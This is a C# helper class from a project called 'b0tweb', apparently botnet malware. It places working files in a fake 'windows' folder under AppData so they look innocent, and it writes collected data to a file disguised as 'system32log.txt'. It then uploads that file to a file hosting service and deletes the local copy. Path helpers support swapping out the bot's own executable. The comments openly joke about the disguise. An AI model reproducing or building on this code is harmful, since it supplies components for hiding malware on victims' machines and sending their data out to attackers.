﻿using System;
using System.IO;
using System.Reflection;

namespace b0tweb
{
    /// <summary>
    /// FileHelper implements general file operations we need in the b0tweb.
    /// </summary>
    class FileHelper
    {
        /// <summary>
        /// Get the path where the executable is located.
        /// </summary>
        /// <returns>The path where the executable is located.</returns>
        public static string GetBasePath()
        {
            return Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
        }

        /// <summary>
        /// Get a temporary file location in a "non-shady" folder.
        /// </summary>
        /// <param name="name">The name of the file you want to store</param>
        /// <returns>The full file path for the file.</returns>
        public static string GetTemporaryFilePath(string name)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string fakepath = Path.Combine(appdata, "windows");

            Directory.CreateDirectory(fakepath);

            return Path.Combine(fakepath, name);
        }

        /// <summary>
        /// Deletes a file at a given location.
        /// </summary>
        /// <param name="path">The file location.</param>
        public static void DeleteFile(string path)
        {
            if (!File.Exists(path)) return;

            File.Delete(path);
        }

        /// <summary>
        /// Gets the filepath of the binary.
        /// </summary>
        /// <returns>Filepath of the binary.</returns>
        public static string GetBinaryPath()
        {
            return FileHelper.GetBasePath() + @"\b0tweb.exe";
        }

        /// <summary>
        /// Gets the filepath of the old binary.
        /// </summary>
        /// <returns>Filepath of the old binary.</returns>
        public static string GetBinaryOldPath()
        {
            return FileHelper.GetBasePath() + @"\b0tweb_old.exe";
        }

        /// <summary>
        /// Uploads the data to file hosting service
        /// </summary>
        /// <param name="content">data string to upload</param>
        /// <returns>url to the uploaded file</returns>
        public static string UploadString(string content)
        {
            // Totally not a shady name
            string path = FileHelper.GetTemporaryFilePath("system32log.txt");

            using (StreamWriter writer = new StreamWriter(path))
            {
                writer.WriteLine(content);
            }

            string url = HTTPHelper.Upload(path);

            FileHelper.DeleteFile(path);

            return url;
        }
    }
}
